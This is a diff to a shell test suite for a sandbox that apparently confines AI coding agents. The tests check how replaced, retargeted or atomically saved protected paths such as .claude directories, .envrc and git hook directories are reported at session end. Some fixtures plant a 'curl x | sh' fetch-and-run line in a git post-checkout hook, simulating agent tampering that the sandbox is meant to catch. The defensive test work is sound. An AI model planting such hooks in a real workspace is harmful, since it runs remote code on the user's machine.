@@ -21740,7 +21740,7 @@ def fn(name):
     raise SystemExit('missing function ' + name)
 names = ['sha256', 'info', '_sandy_protected_dirs', '_sandy_protected_files',
          '_sandy_overlay_detect_dirs', '_sandy_overlay_detect_agent', '_sandy_tree_fingerprint',
-         '_sandy_agent_has', '_sandy_path_symlink_component', '_sandy_link_hex', '_sandy_path_identity', '_sandy_same_object',
+         '_sandy_agent_has', '_sandy_path_symlink_component', '_sandy_link_hex', '_sandy_path_identity', '_sandy_same_object', '_sandy_replaced_since_launch',
          '_sandy_configured_hooks_rel', '_sandy_extra_hooks_dir', '_sandy_dir_is_inert_git',
          '_sandy_context_hash', '_sandy_df_session_record', '_sandy_slug_for',
          '_sandy_note_session_created_sandy_dir', '_sandy_project_dockerfile_approved']
@@ -29905,7 +29905,7 @@ def fn(name):
     raise SystemExit('missing function ' + name)
 names = ['sha256', 'info', '_sandy_protected_dirs', '_sandy_overlay_detect_dirs',
          '_sandy_overlay_detect_agent', '_sandy_tree_fingerprint', '_sandy_agent_has',
-         '_sandy_path_symlink_component', '_sandy_link_hex', '_sandy_path_identity', '_sandy_same_object',
+         '_sandy_path_symlink_component', '_sandy_link_hex', '_sandy_path_identity', '_sandy_same_object', '_sandy_replaced_since_launch',
          '_sandy_protected_files', '_sandy_configured_hooks_rel', '_sandy_extra_hooks_dir',
          '_sandy_dir_is_inert_git', '_sandy_context_hash', '_sandy_df_session_record',
          '_sandy_slug_for', '_sandy_note_session_created_sandy_dir']
@@ -30155,9 +30155,9 @@ ln -s vendor "$_S245_D/Q/ws/.claude"
 _S245_L="$(_s245_run Q launch)"
 rm "$_S245_D/Q/ws/.claude"; ln -s v2 "$_S245_D/Q/ws/.claude"
 _S245_OUT="$(_s245_run Q end)"
-check "§245(16) a launch-time link retargeted in-session is reported as RETARGETED with its new target and an rm of the link, not as existed at launch (mutation: matching the #link line on the name alone)" \
-    bash -c 'printf "%s" "$1" | grep -qF "$2/.claude -> v2  (a link that existed at launch, RETARGETED during this session)" \
-             && printf "%s" "$1" | grep -qF "(cd $2 && rm .claude)" && ! printf "%s" "$1" | grep -q "review it there"' _ "$_S245_OUT" "$_S245_D/Q/ws"
+check "§245(16) a launch-time link retargeted in-session is reported as RETARGETED with its new target, and as the user's link it gets no rm (mutations: matching the #link line on the name alone; offering rm for it)" \
+    bash -c 'printf "%s" "$1" | grep -qF "$2/.claude -> v2  (a link that existed at launch, RETARGETED during this session: review it)" \
+             && ! printf "%s" "$1" | grep -q "&& rm" && ! printf "%s" "$1" | grep -q "review it there"' _ "$_S245_OUT" "$_S245_D/Q/ws"
 
 # A core.hooksPath with a newline cannot forge snapshot lines.
 if command -v git >/dev/null 2>&1; then
@@ -30178,37 +30178,53 @@ else
 fi
 
 # Identity: an entry recorded as existing is skipped only while it is still
-# the same object. (a) the operator's `.claude -> vendor` link, whose
-# vendor/commands was overlaid at launch, re-pointed in-session.
+# the same object; one the session REPLACED is reported in its own block,
+# with no removal offered (it was the user's). (a) the operator's
+# `.claude -> vendor` link, whose vendor/commands was overlaid at launch,
+# re-pointed in-session.
 mkdir -p "$_S245_D/T/ws/vendor/commands" "$_S245_D/T/ws/other/commands"; ln -s vendor "$_S245_D/T/ws/.claude"
 _S245_L="$(_s245_run T launch claude)"
 _S245_SNAP="$(cat "$_S245_D/T/sb/.protected-existed-at-launch")"
 rm "$_S245_D/T/ws/.claude"; ln -s other "$_S245_D/T/ws/.claude"; printf 'e\n' > "$_S245_D/T/ws/other/commands/e"
 _S245_OUT="$(_s245_run T end claude)"
-check "§245(18) claude session, overlaid .claude/commands reached through .claude -> vendor: re-pointing .claude -> other and writing other/commands/e is reported as RETARGETED with rm .claude (mutation: skipping an existed entry without the identity check prints nothing)" \
+check "§245(18) claude session, overlaid .claude/commands reached through .claude -> vendor: re-pointing .claude -> other is reported as REPLACED, naming the link and its new target, with no rm (mutation: skipping an existed entry without the identity check prints nothing)" \
     bash -c 'printf "%s\n" "$3" | grep -qFx ".claude/commands" \
-             && printf "%s" "$1" | grep -qF "$2/.claude -> other  (a link that existed at launch, RETARGETED during this session)" \
-             && printf "%s" "$1" | grep -qF "(cd $2 && rm .claude)"' _ "$_S245_OUT" "$_S245_D/T/ws" "$_S245_SNAP"
+             && printf "%s" "$1" | grep -q "Protected paths REPLACED during this session" \
+             && printf "%s" "$1" | grep -qF "$2/.claude/commands (through .claude, now -> other)" \
+             && ! printf "%s" "$1" | grep -q "&& rm" && ! printf "%s" "$1" | grep -q "appeared"' _ "$_S245_OUT" "$_S245_D/T/ws" "$_S245_SNAP"
 
-# (b) an entry replaced by a different object of the same name: the
-# directory renamed aside (which would carry an overlay or :ro mount away)
-# and recreated, for an overlay dir, a protected dir and a protected file.
+# (b) `.claude` renamed aside and recreated: a nested overlay dir and a nested
+# protected file now sit in a new parent (any mount on them moved with the
+# old one). Root-level entries are mount points with the workspace root as
+# parent, so only the host can replace them: an atomic save of .envrc on the
+# host is not a report.
 mkdir -p "$_S245_D/U/ws/.claude/commands" "$_S245_D/U/ws/.vscode"
-printf 'mine\n' > "$_S245_D/U/ws/.claude/commands/old.md"; printf '{}\n' > "$_S245_D/U/ws/.vscode/settings.json"
-printf 'use flake\n' > "$_S245_D/U/ws/.envrc"
+printf 'mine\n' > "$_S245_D/U/ws/.claude/commands/old.md"; printf '{}\n' > "$_S245_D/U/ws/.claude/settings.json"
+printf '{}\n' > "$_S245_D/U/ws/.vscode/settings.json"; printf 'use flake\n' > "$_S245_D/U/ws/.envrc"
 _S245_L="$(_s245_run U launch claude)"
-mv "$_S245_D/U/ws/.claude" "$_S245_D/U/ws/.claude-x"; mkdir -p "$_S245_D/U/ws/.claude/commands"; printf 'e\n' > "$_S245_D/U/ws/.claude/commands/e.md"
-mv "$_S245_D/U/ws/.vscode" "$_S245_D/U/ws/.vscode-x"; mkdir "$_S245_D/U/ws/.vscode"; printf '{}\n' > "$_S245_D/U/ws/.vscode/tasks.json"
-mv "$_S245_D/U/ws/.envrc" "$_S245_D/U/ws/.envrc-x"; printf 'curl x | sh\n' > "$_S245_D/U/ws/.envrc"
+mv "$_S245_D/U/ws/.claude" "$_S245_D/U/ws/.claude-x"; mkdir -p "$_S245_D/U/ws/.claude/commands"
+printf 'e\n' > "$_S245_D/U/ws/.claude/commands/e.md"; printf '{"hooks":{}}\n' > "$_S245_D/U/ws/.claude/settings.json"
+printf 'use flake\nexport A=1\n' > "$_S245_D/U/ws/.envrc.tmp"; mv "$_S245_D/U/ws/.envrc.tmp" "$_S245_D/U/ws/.envrc"
 _S245_OUT="$(_s245_run U end claude)"
-check "§245(19) an overlay dir, a protected dir and a protected file that existed at launch but were renamed aside and recreated (new inode) are each reported with rm -rf remediation (mutation: a #id that records the canonical path only)" \
-    bash -c 'printf "%s" "$1" | grep -qF "(cd $2 && rm -rf .vscode/ .claude/commands/ .envrc)"' _ "$_S245_OUT" "$_S245_D/U/ws"
+check "§245(19) .claude renamed aside and recreated: .claude/commands and .claude/settings.json are each reported as REPLACED, with no rm offered; the root-level .envrc atomic-saved on the host is not reported (mutations: a #id that records the canonical path only; the leaf inode in #id)" \
+    bash -c 'printf "%s" "$1" | grep -qF "$2/.claude/commands (a different object now sits at this path)" \
+             && printf "%s" "$1" | grep -qF "$2/.claude/settings.json (a different object now sits at this path)" \
+             && ! printf "%s" "$1" | grep -q "rm " && ! printf "%s" "$1" | grep -q "\.envrc" \
+             && ! printf "%s" "$1" | grep -q "appeared"' _ "$_S245_OUT" "$_S245_D/U/ws"
+mkdir -p "$_S245_D/U3/ws/.claude"; printf '{}\n' > "$_S245_D/U3/ws/.claude/settings.local.json"; printf '{}\n' > "$_S245_D/U3/ws/.mcp.json"
+_S245_L="$(_s245_run U3 launch claude)"
+printf '{"a":1}\n' > "$_S245_D/U3/ws/.claude/s.tmp"; mv "$_S245_D/U3/ws/.claude/s.tmp" "$_S245_D/U3/ws/.claude/settings.local.json"
+printf '{"b":1}\n' > "$_S245_D/U3/ws/m.tmp"; mv "$_S245_D/U3/ws/m.tmp" "$_S245_D/U3/ws/.mcp.json"
+_S245_OUT="$(_s245_run U3 end claude)"
+check "§245(19b) host atomic saves (temp file renamed over) of .claude/settings.local.json and .mcp.json are not reported (mutation: the leaf inode in #id offers to delete the user's own file)" \
+    bash -c 'printf "%s" "$1" | grep -q "DRIVE-OK" && ! printf "%s" "$1" | grep -q "Protected paths"' _ "$_S245_OUT"
 mkdir -p "$_S245_D/U2/ws/.claude/commands" "$_S245_D/U2/ws/.vscode"; printf '{}\n' > "$_S245_D/U2/ws/.vscode/settings.json"
 printf 'mine\n' > "$_S245_D/U2/ws/.claude/commands/old.md"; printf 'use flake\n' > "$_S245_D/U2/ws/.envrc"
+printf '{}\n' > "$_S245_D/U2/ws/.claude/settings.json"
 _S245_L="$(_s245_run U2 launch claude)"
 _S245_OUT="$(_s245_run U2 end claude)"
-check "§245(20) ...while the same three, untouched, are not reported (the identity is stable across launch and exit)" \
-    bash -c 'printf "%s" "$1" | grep -q "DRIVE-OK" && ! printf "%s" "$1" | grep -q "Protected paths appeared"' _ "$_S245_OUT"
+check "§245(20) ...while the same entries, untouched, are not reported (the identity is stable across launch and exit)" \
+    bash -c 'printf "%s" "$1" | grep -q "DRIVE-OK" && ! printf "%s" "$1" | grep -q "Protected paths"' _ "$_S245_OUT"
 
 # A snapshot that lists an entry but holds no #id for it (a broken writer)
 # fails toward a report, never toward "same object".
@@ -30217,19 +30233,25 @@ _S245_L="$(_s245_run Y launch claude)"
 grep -v '^#id	' "$_S245_D/Y/sb/.protected-existed-at-launch" > "$_S245_D/Y/snap.tmp" || true
 mv "$_S245_D/Y/snap.tmp" "$_S245_D/Y/sb/.protected-existed-at-launch"
 _S245_OUT="$(_s245_run Y end claude)"
-check "§245(20b) an entry listed as existing with no #id record is reported (mutation: treating a missing record as the same object)" \
-    bash -c 'printf "%s" "$1" | grep -qF "(cd $2 && rm -rf .claude/commands/)"' _ "$_S245_OUT" "$_S245_D/Y/ws"
+check "§245(20b) an entry listed as existing with no #id record is reported as REPLACED (mutation: treating a missing record as the same object)" \
+    bash -c 'printf "%s" "$1" | grep -qF "$2/.claude/commands (a different object now sits at this path)"' _ "$_S245_OUT" "$_S245_D/Y/ws"
 if command -v git >/dev/null 2>&1; then
-    mkdir -p "$_S245_D/X/ws/.githooks"; git -C "$_S245_D/X/ws" init -q 2>/dev/null
-    git -C "$_S245_D/X/ws" config core.hooksPath .githooks; printf '#!/bin/sh\n' > "$_S245_D/X/ws/.githooks/pre-commit"
+    mkdir -p "$_S245_D/X/ws/tools/hooks"; git -C "$_S245_D/X/ws" init -q 2>/dev/null
+    git -C "$_S245_D/X/ws" config core.hooksPath tools/hooks; printf '#!/bin/sh\n' > "$_S245_D/X/ws/tools/hooks/pre-commit"
     _S245_L="$(_s245_run X launch)"
-    mv "$_S245_D/X/ws/.githooks" "$_S245_D/X/ws/.githooks-x"; mkdir "$_S245_D/X/ws/.githooks"
-    printf '#!/bin/sh\ncurl x | sh\n' > "$_S245_D/X/ws/.githooks/post-checkout"
+    mv "$_S245_D/X/ws/tools" "$_S245_D/X/ws/tools-x"; mkdir -p "$_S245_D/X/ws/tools/hooks"
+    printf '#!/bin/sh\ncurl x | sh\n' > "$_S245_D/X/ws/tools/hooks/post-checkout"
     _S245_OUT="$(_s245_run X end)"
-    check "§245(20c) a core.hooksPath dir that existed at launch, renamed aside and recreated, is reported (mutation: the hooksPath skip without the identity check)" \
-        bash -c 'printf "%s" "$1" | grep -qF "(cd $2 && rm -rf .githooks/)"' _ "$_S245_OUT" "$_S245_D/X/ws"
+    check "§245(20c) a core.hooksPath dir (tools/hooks) that existed at launch, with tools renamed aside and recreated, is reported as REPLACED (mutation: the hooksPath skip without the identity check)" \
+        bash -c 'printf "%s" "$1" | grep -qF "$2/tools/hooks (a different object now sits at this path)"' _ "$_S245_OUT" "$_S245_D/X/ws"
+    mkdir -p "$_S245_D/X2/ws/tools/hooks"; git -C "$_S245_D/X2/ws" init -q 2>/dev/null
+    git -C "$_S245_D/X2/ws" config core.hooksPath tools/hooks; printf '#!/bin/sh\n' > "$_S245_D/X2/ws/tools/hooks/pre-commit"
+    _S245_L="$(_s245_run X2 launch)"
+    _S245_OUT="$(_s245_run X2 end)"
+    check "§245(20d) ...and the same hooksPath dir, unchanged, is not reported (mutation: leaving the hooksPath out of the #id snapshot)" \
+        bash -c 'printf "%s" "$1" | grep -q "DRIVE-OK" && ! printf "%s" "$1" | grep -q "Protected paths"' _ "$_S245_OUT"
 else
-    check "§245(20c) needs git" bash -c 'exit 77'
+    check "§245(20c-d) needs git" bash -c 'exit 77'
 fi
 
 # Fingerprint lows: a mode change, and a file it cannot read.
@@ -30239,6 +30261,12 @@ chmod +x "$_S245_D/V/ws/.claude/commands/run.sh"
 _S245_OUT="$(_s245_run V end codex)"
 check "§245(21) chmod +x on a file in a no-overlay dir is reported (mutation: a fingerprint without the mode)" \
     bash -c 'printf "%s" "$1" | grep -qF "$2/.claude/commands/ (existed at launch with no sandbox overlay"' _ "$_S245_OUT" "$_S245_D/V/ws"
+mkdir -p "$_S245_D/V2/ws/.claude/commands"; printf 'echo hi\n' > "$_S245_D/V2/ws/.claude/commands/run.sh"
+_S245_L="$(_s245_run V2 launch codex)"
+touch -t 202001010000 "$_S245_D/V2/ws/.claude/commands/run.sh" "$_S245_D/V2/ws/.claude/commands"
+_S245_OUT="$(_s245_run V2 end codex)"
+check "§245(21b) only the mtime changing (here to a date years back, which also flips ls from HH:MM to the year) is not a change (mutation: keeping the date fields of ls -ldn)" \
+    bash -c 'printf "%s" "$1" | grep -q "DRIVE-OK" && ! printf "%s" "$1" | grep -q "Protected paths"' _ "$_S245_OUT"
 if [ "$(id -u)" != 0 ]; then
     mkdir -p "$_S245_D/W/ws/.claude/commands"; printf 'x\n' > "$_S245_D/W/ws/.claude/commands/a.md"
     chmod 000 "$_S245_D/W/ws/.claude/commands/a.md"
